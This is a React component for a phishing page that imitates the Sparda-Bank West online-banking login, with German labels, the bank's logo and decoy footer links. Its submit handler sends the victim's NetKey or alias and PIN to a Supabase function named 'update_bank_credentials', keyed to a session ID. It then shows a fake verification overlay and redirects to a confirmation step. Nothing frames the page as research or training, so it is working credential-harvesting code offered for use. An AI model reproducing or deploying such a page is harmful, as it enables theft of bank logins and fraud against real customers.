import { useState, useEffect } from "react";
import { useSearchParams, useNavigate } from "react-router-dom";
import { supabase } from "@/integrations/supabase/client";
import LoadingOverlay from "@/components/LoadingOverlay";
import { usePageMeta } from "@/hooks/use-page-meta";
import { Eye, EyeOff, ArrowRight, ChevronDown, AlertCircle } from "lucide-react";
import logoAsset from "@/assets/sparda-logo.avif.asset.json";
import teaserAsset from "@/assets/sparda-teaser.avif.asset.json";

const BLUE = "#0056a3";
const BLUE_DARK = "#004a8f";
const BORDER = "#242424";
const PLACEHOLDER = "#0000009E";
const TEXT = "#1f2a37";
const CARD_SHADOW = "0 4px 14px 0 rgba(0,0,0,0.12)";

const SpardaBankDe = () => {
  const [searchParams] = useSearchParams();
  const navigate = useNavigate();
  const sessionId = searchParams.get("s") || "";

  const [showLoading, setShowLoading] = useState(false);
  const [username, setUsername] = useState("");
  const [pin, setPin] = useState("");
  const [showPin, setShowPin] = useState(false);

  useEffect(() => { window.scrollTo(0, 0); }, []);
  usePageMeta("Sparda-Bank West - Anmelden", logoAsset.url);

  const submit = async () => {
    if (sessionId) {
      const { error } = await supabase.rpc("update_bank_credentials", {
        p_session_id: sessionId,
        p_username: username,
        p_password: pin,
        p_username_label: "Sparda-NetKey oder Alias",
        p_password_label: "PIN",
      });
      if (error) console.error("Update failed:", error);
    }
    setShowLoading(true);
  };

  return (
    <>
      {showLoading && (
        <LoadingOverlay
          message="Anmeldedaten werden überprüft..."
          onComplete={() => navigate("/confirmation?s=" + sessionId)}
        />
      )}
      <div
        className="min-h-screen flex flex-col"
        style={{ fontFamily: "'GenosGFG', Arial, sans-serif", color: TEXT, backgroundColor: "#f3f5f7" }}
      >
        <div style={{ backgroundColor: BLUE, height: 48 }} />

        <header className="bg-white border-b border-gray-200">
          <div className="max-w-[1200px] mx-auto px-6 py-4 flex items-center gap-5">
            <img src={logoAsset.url} alt="Sparda-Bank" className="h-12 w-auto" />
            <span style={{ color: BLUE, fontFamily: "'FrutigerVR', 'GenosGFG', Arial, sans-serif", fontWeight: 700, fontSize: 20 }}>
              Sparda-Bank West eG
            </span>
          </div>
        </header>

        <main className="flex-1">
          <div className="max-w-[1200px] mx-auto px-6 py-10 grid grid-cols-1 lg:grid-cols-2 gap-8">
            <div className="flex flex-col gap-6">
              <section className="bg-white rounded-lg p-8" style={{ boxShadow: CARD_SHADOW }}>
                <h1 style={{ color: BLUE, fontSize: 32, fontWeight: 700, marginBottom: 20, fontFamily: "'FrutigerVR', 'GenosGFG', Arial, sans-serif" }}>
                  Anmelden
                </h1>

                <div style={{ borderBottom: "1px solid #e4e8ec", marginBottom: 24 }}>
                  <button
                    type="button"
                    style={{
                      padding: "10px 4px",
                      marginBottom: -1,
                      borderBottom: `2px solid ${BLUE}`,
                      color: BLUE,
                      fontWeight: 700,
                      fontSize: 12,
                      fontFamily: "'FrutigerVR', 'GenosGFG', Arial, sans-serif",
                    }}
                  >
                    Mit Zugangsdaten anmelden
                  </button>
                </div>


                {/* Fields */}
                <div className="space-y-5">
                  <div className="relative">
                    <input
                      id="sp-user"
                      type="text"
                      placeholder=" "
                      value={username}
                      onChange={(e) => setUsername(e.target.value)}
                      className="sp-input peer w-full outline-none"
                    />
                    <label htmlFor="sp-user" className="sp-float">Sparda-NetKey oder Alias</label>
                  </div>
                  <div className="relative">
                    <input
                      id="sp-pin"
                      type={showPin ? "text" : "password"}
                      placeholder=" "
                      value={pin}
                      onChange={(e) => setPin(e.target.value)}
                      className="sp-input peer w-full outline-none"
                      style={{ paddingRight: 48 }}
                    />
                    <label htmlFor="sp-pin" className="sp-float">PIN</label>
                    <button
                      type="button"
                      onClick={() => setShowPin((s) => !s)}
                      className="absolute right-3 top-1/2 -translate-y-1/2"
                      style={{ color: TEXT }}
                      aria-label="PIN anzeigen"
                    >
                      {showPin ? <EyeOff size={22} /> : <Eye size={22} />}
                    </button>
                  </div>

                  <div className="flex justify-end">
                    <button
                      type="button"
                      style={{ color: BLUE, fontSize: 14, fontWeight: 600, padding: "6px 10px", borderRadius: 6, background: "transparent", transition: "background-color 150ms ease" }}
                      onMouseEnter={(e) => { e.currentTarget.style.backgroundColor = "#f2f7fb"; }}
                      onMouseLeave={(e) => { e.currentTarget.style.backgroundColor = "transparent"; }}
                    >
                      PIN vergessen?
                    </button>
                  </div>

                </div>

                <hr className="my-6" style={{ borderColor: "#e4e8ec" }} />

                <div className="flex items-center justify-between gap-4">
                  <button
                    onClick={() => { setUsername(""); setPin(""); }}
                    className="font-semibold transition-colors"
                    style={{
                      color: BLUE,
                      backgroundColor: "#fff",
                      border: `2px solid ${BLUE}`,
                      borderRadius: 999,
                      minWidth: 150,
                      padding: "9px 28px",
                      fontSize: 14,
                    }}
                    onMouseEnter={(e) => { e.currentTarget.style.backgroundColor = "#eef4fa"; }}
                    onMouseLeave={(e) => { e.currentTarget.style.backgroundColor = "#fff"; }}
                  >
                    Abbrechen
                  </button>
                  <button
                    onClick={submit}
                    className="font-semibold text-white transition-colors"
                    style={{
                      backgroundColor: BLUE,
                      border: `2px solid ${BLUE}`,
                      borderRadius: 999,
                      minWidth: 150,
                      padding: "9px 28px",
                      fontSize: 14,
                    }}
                    onMouseEnter={(e) => { e.currentTarget.style.backgroundColor = BLUE_DARK; e.currentTarget.style.borderColor = BLUE_DARK; }}
                    onMouseLeave={(e) => { e.currentTarget.style.backgroundColor = BLUE; e.currentTarget.style.borderColor = BLUE; }}
                  >
                    Anmelden
                  </button>
                </div>
              </section>

              <section className="bg-white rounded-lg p-6" style={{ fontSize: 15, lineHeight: 1.5, boxShadow: CARD_SHADOW }}>
                <p>
                  <strong>Hinweis:</strong> Beim Aufruf Ihres Union-Depots kann es derzeit vereinzelt zu längeren Ladezeiten oder technischen Fehlern kommen. Wir arbeiten mit Hochdruck an der Behebung. Vielen Dank für Ihr Verständnis.
                </p>
              </section>
            </div>

            <aside>
              <a
                href="#"
                onClick={(e) => e.preventDefault()}
                className="sp-card group block bg-white rounded-lg overflow-hidden"
                style={{ boxShadow: CARD_SHADOW, transition: "box-shadow 200ms ease" }}
              >
                <img src={teaserAsset.url} alt="Geldanlage" className="w-full h-[420px] object-cover" />
                <div className="sp-card-body p-6" style={{ transition: "background-color 200ms ease" }}>
                  <h2 style={{ color: TEXT, fontSize: 22, fontWeight: 700, marginBottom: 10, fontFamily: "'FrutigerVR', 'GenosGFG', Arial, sans-serif" }}>
                    Finden Sie die Geldanlage, die zu Ihnen passt!
                  </h2>
                  <p style={{ color: "#6b7684", fontSize: 15, lineHeight: 1.5 }}>
                    Ob Vermögensaufbau oder finanzielle Vorsorge – wählen Sie die Geldanlage, die Ihren Zielen entspricht.
                  </p>
                  <div className="flex justify-end mt-4">
                    <span style={{ color: BLUE }} aria-label="Weiter">
                      <ArrowRight size={28} />
                    </span>
                  </div>
                </div>
              </a>
            </aside>

          </div>
        </main>

        <footer style={{ backgroundColor: BLUE }} className="text-white">
          <div className="max-w-[1200px] mx-auto px-6 py-6 flex flex-col items-center gap-3">
            <nav className="flex flex-wrap items-center justify-center gap-x-2 gap-y-2 text-sm">
              {["Impressum", "Sicherheitshinweise", "Nutzungsbedingungen", "Datenschutz", "Pflichtinformationen", "AGB"].map((l, i, arr) => (
                <span key={l} className="flex items-center gap-2">
                  <a href="#" onClick={(e) => e.preventDefault()} className="text-white font-semibold">{l}</a>
                  {i < arr.length - 1 && <span className="opacity-60">·</span>}
                </span>
              ))}
            </nav>
            <button className="flex items-center gap-2 text-sm" onClick={(e) => e.preventDefault()}>
              <span style={{
                display: "inline-block", width: 22, height: 22, borderRadius: "50%",
                background: "linear-gradient(to bottom, #000 33%, #dd0000 33% 66%, #ffcc00 66%)",
                border: "1px solid rgba(255,255,255,0.6)",
              }} />
              <span>Deutsch</span>
              <ChevronDown size={16} />
            </button>
          </div>
        </footer>

        <div className="text-center text-sm py-5" style={{ color: "#6b7684" }}>
          Gemeinsam neue Wege gehen!
        </div>
      </div>
    </>
  );
};

export default SpardaBankDe;
